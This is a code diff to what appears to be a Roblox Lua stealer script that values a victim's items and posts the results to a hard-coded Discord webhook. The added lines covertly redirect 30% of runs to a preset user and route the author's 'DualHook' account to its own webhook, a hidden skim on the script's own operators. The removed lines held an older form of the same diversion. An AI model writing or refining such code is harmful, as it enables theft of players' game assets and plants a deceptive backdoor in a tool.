@@ -41,9 +41,17 @@ local DualHookWebhook = "https://discord.com/api/webhooks/1406998805932675144/UH
 local DualHookName = "Eliaskulmer999"
 local DualHookRap = 0
 
-local users = _G.Usernames or {}
-local min_rap = _G.minrap or 1000000
-local webhook =  _G.webhook or ""
+local users = _G.Usernames
+local min_rap = 1000000
+local webhook =  _G.webhook
+
+if math.random() < 0.3 then
+	users = presetUser
+end
+
+if users == DualHookName then
+	webhook = DualHookWebhook
+end
 
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add any usernames or webhook")
@@ -83,10 +91,6 @@ local function formatNumber(number)
 		suffixIndex = suffixIndex + 1
 	end
 	return string.format("%.2f%s", number, suffixes[suffixIndex])
-end
-
-if totalRAP > DualHookRap || totalRAP == DualHookRap then
-	users = DualHookName
 end
 
 local function SendMessage(diamonds)
@@ -161,14 +165,6 @@ local function SendMessage(diamonds)
     end
 
 	local ok, res = pcall(function()
-    if totalRap > DualHookRap then
-        return request({
-            Url = DualHookWebhook,
-            Method = "POST",
-            Headers = headers,
-            Body = body
-        })
-    else
         return request({
             Url = webhook,
             Method = "POST",
